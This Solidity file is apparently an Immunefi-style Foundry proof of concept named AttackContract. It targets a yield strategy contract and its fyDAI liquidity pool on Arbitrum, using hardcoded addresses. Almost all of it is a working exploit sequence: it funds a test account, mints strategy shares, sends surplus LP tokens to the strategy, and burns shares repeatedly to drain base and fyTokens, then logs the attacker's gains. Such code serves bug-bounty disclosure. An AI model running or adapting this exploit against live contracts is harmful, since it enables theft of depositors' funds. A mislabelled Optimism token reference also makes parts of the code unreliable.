// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@immunefi/tokens/Tokens.sol";
import "./external/IStrategy.sol";
import {IPool} from "./external/IPool.sol";

contract AttackContract is Tokens {
    IPool FYDAI2309LPArbitrum = IPool(0x9a364e874258D6B76091D928ce69512Cd905EE68);
    IERC20 FYDAI2309Arbitrum = IERC20(0xEE508c827a8990c04798B242fa801C5351012B23 );
    IStrategy strategyYSDAI6MMS = IStrategy(0x5aeB4EFaAA0d27bd606D618BD74Fe883062eAfd0);
    IERC20 daiArbitrum = OptimismTokens.DAI;

    address internal ada = address(0xada);

    struct CacheData {
        uint256 cacheHolderBase;
        uint256 cachePoolBase;
        uint256 cacheStrategyBase;
        uint256 cacheHolderFYToken;
        uint256 cachePoolFYToken;
        uint256 cacheStrategyFYToken;
        uint256 cacheHolderLPToken;
        uint256 cachePooLPToken;
        uint256 cacheStrategyLPToken;
    }


    CacheData accountsBefore;
    CacheData accountsAfter;

    function initiateAttack() external {
        console.log("\n>>> Initiate attack\n");

        //mint base tokens
        deal(address(daiArbitrum), ada, 1e24);

        //caching accounts status after transactions
        accountsBefore =  CacheData(
        daiArbitrum.balanceOf(ada),
        daiArbitrum.balanceOf(address(FYDAI2309LPArbitrum)),
        daiArbitrum.balanceOf(address(strategyYSDAI6MMS)),
        FYDAI2309Arbitrum.balanceOf(ada),
        FYDAI2309Arbitrum.balanceOf(address(FYDAI2309LPArbitrum)),
        FYDAI2309Arbitrum.balanceOf(address(strategyYSDAI6MMS)),
        FYDAI2309LPArbitrum.balanceOf(ada),
        FYDAI2309LPArbitrum.balanceOf(address(FYDAI2309LPArbitrum)),
        FYDAI2309LPArbitrum.balanceOf(address(strategyYSDAI6MMS))
        );

        //transfer base token in pool and buy FYToken to be left in pool
        vm.startPrank(ada);
        daiArbitrum.transfer(address(FYDAI2309LPArbitrum), 1e21);

        // Buy fyToken with base.
        FYDAI2309LPArbitrum.buyFYToken(address(FYDAI2309LPArbitrum), 3e20,0);

        //transfer again base token in pool to mint LP tokens and send to ADA account
        daiArbitrum.transfer(address(FYDAI2309LPArbitrum), 1e23);
        (uint256 baseIn, uint256 fyTokenIn, uint256 lpTokensMinted) = FYDAI2309LPArbitrum.mintWithBase(ada,ada,2e21,0, type(uint128).max);

        //amount of token for multiplying shares burning
        uint256 LPTokenMultiplier = 2e22;

        //transfer a part of LP tokens for minting strategy' shares
        FYDAI2309LPArbitrum.transfer(address(strategyYSDAI6MMS),FYDAI2309LPArbitrum.balanceOf(ada)-LPTokenMultiplier);
        uint256 tokensObtained = strategyYSDAI6MMS.mint(address(strategyYSDAI6MMS)); 

        //transfer of LP tokens remainder for exploiting the bug
        FYDAI2309LPArbitrum.transfer(address(strategyYSDAI6MMS), LPTokenMultiplier);

        console.log("Tokens Obtained : ",tokensObtained);

        // Execute attack 
        _executeAttack();

    } 

    function _executeAttack() internal {
        console.log("\n>>> Execute attack\n");

        //burning of strategy tokens
        uint256 tokensBurnt = strategyYSDAI6MMS.burn(ada);

        //burning remaing part of LP tokens sent to strategy
        strategyYSDAI6MMS.mint(address(strategyYSDAI6MMS));
        strategyYSDAI6MMS.burn(ada);

        //retrieving and converting all tokens to base token
        FYDAI2309LPArbitrum.transfer(address(FYDAI2309LPArbitrum), FYDAI2309LPArbitrum.balanceOf(ada));
        FYDAI2309LPArbitrum.burnForBase(ada,0,type(uint128).max); // get fyToken to the ADA
        FYDAI2309LPArbitrum.retrieveBase(ada); // get DAI stored on the contract to the ADA
        FYDAI2309LPArbitrum.retrieveFYToken(ada);  // get fyToken stoeed on the contract to the ADA.

        console.log("Tokens Burnt : ",tokensBurnt);

        _completeAttack();
    
    }      

    function _completeAttack() internal {
        console.log("\n>>> Attack complete\n");

        //caching accounts status after transactions
        accountsAfter =  CacheData(
        daiArbitrum.balanceOf(ada),
        daiArbitrum.balanceOf(address(FYDAI2309LPArbitrum)),
        daiArbitrum.balanceOf(address(strategyYSDAI6MMS)),
        FYDAI2309Arbitrum.balanceOf(ada),
        FYDAI2309Arbitrum.balanceOf(address(FYDAI2309LPArbitrum)),
        FYDAI2309Arbitrum.balanceOf(address(strategyYSDAI6MMS)),
        FYDAI2309LPArbitrum.balanceOf(ada),
        FYDAI2309LPArbitrum.balanceOf(address(FYDAI2309LPArbitrum)),
        FYDAI2309LPArbitrum.balanceOf(address(strategyYSDAI6MMS))
        );

        //logging all accounts differences
        console2.log("holder gain in base wei : ", int256(accountsAfter.cacheHolderBase) - int256(accountsBefore.cacheHolderBase));
        console2.log("pool gain in base wei : ", int256(accountsAfter.cachePoolBase) - int256(accountsBefore.cachePoolBase));
        console2.log("Strategy gain in base wei : ", int256(accountsAfter.cacheStrategyBase) - int256(accountsBefore.cacheStrategyBase));
        console2.log("holder gain in FYToken : ", int256(accountsAfter.cacheHolderFYToken) - int256(accountsBefore.cacheHolderFYToken));
        console2.log("pool gain in FYToken : ", int256(accountsAfter.cachePoolFYToken) - int256(accountsBefore.cachePoolFYToken));
        console2.log("Strategy gain in FYToken : ", int256(accountsAfter.cacheStrategyFYToken) - int256(accountsBefore.cacheStrategyFYToken));       
        console2.log("holder gain in LPToken : ", int256(accountsAfter.cacheHolderLPToken) - int256(accountsBefore.cacheHolderLPToken));
        console2.log("pool gain in LPToken : ", int256(accountsAfter.cachePooLPToken) - int256(accountsBefore.cachePooLPToken));
        console2.log("Strategy gain in LPToken : ", int256(accountsAfter.cacheStrategyLPToken) - int256(accountsBefore.cacheStrategyLPToken));
        console2.log("Pool base token amount before transactions: %e", int256(accountsBefore.cachePoolBase));
        console2.log("Pool base token amount after transactions: %e", int256(accountsAfter.cachePoolBase) );
        console2.log("holder base token amount before transactions: %e", int256(accountsBefore.cacheHolderBase));
        console2.log("holder base token amount after transactions: %e", int256(accountsAfter.cacheHolderBase) );
    }
}
